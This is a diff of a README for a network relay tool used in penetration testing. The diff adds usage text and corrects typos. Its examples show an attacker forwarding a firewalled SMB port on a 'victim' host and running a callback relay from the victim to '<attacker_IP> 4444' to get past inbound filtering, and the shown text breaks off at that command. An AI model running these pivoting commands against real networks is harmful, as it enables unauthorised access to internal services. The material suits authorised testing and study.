@@ -25,6 +25,20 @@ This tool is a (slightly) simpler version of a netcat relay, without netcat, tri
 
 You should compile your own binary for your systems if you can, but a copy is included in the repo for speediness.
 
+```
+usage: relay.py [-h] [-l LISTEN [LISTEN ...]] [-c CONNECT [CONNECT ...]] [-t] [-v]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -l LISTEN [LISTEN ...], --listen LISTEN [LISTEN ...]
+                        Listen on a given port. Format -l <port>
+  -c CONNECT [CONNECT ...], --connect CONNECT [CONNECT ...]
+                        Connect to a given host & port. Format : -c <host> <port>
+  -t, --tee             Also print all traffic on Stdout.
+  -v, --verbose         Print more stuff during execution.
+```
+It's like nc | nc with backpipes and nc -e nc.bat, but without the faff! 
+
 ### Examples
 
 To forward a firewalled port (say 445 in this example), over a permitted port (5555), run:
@@ -33,13 +47,13 @@ To forward a firewalled port (say 445 in this example), over a permitted port (5
 C:\> relay.exe -c 127.0.0.1 445 -l 5555
 ```
 
-And you'll be able to connect straight up to the victim port 5555 to get SMB access; similarly, if all inbound is filetered, you could run a call back relay. On your attacker:
+And you'll be able to connect straight up to the victim port 5555 to get SMB access; similarly, if all inbound is filtered, you could run a call back relay. On your attacker:
 
 ```
 attacker@attacker ~$ relay.py -l 4444 -l 9999 -v -t
 ```
 
-This will set up a loacl relay to catch the callback and serve relay traffic to port 9999; the v and t tags make the tool vun verbosely and tee all data to the console respectively. Now execute a callback relay from the victim:
+This will set up a local relay to catch the callback and serve relay traffic to port 9999; the *-v* and *-t* tags make the tool vun verbosely and tee all data to the console respectively. Now execute a callback relay from the victim:
 
 ``` 
 C:\relay.exe -c 127.0.0.1 445 -c <attacker_IP> 4444
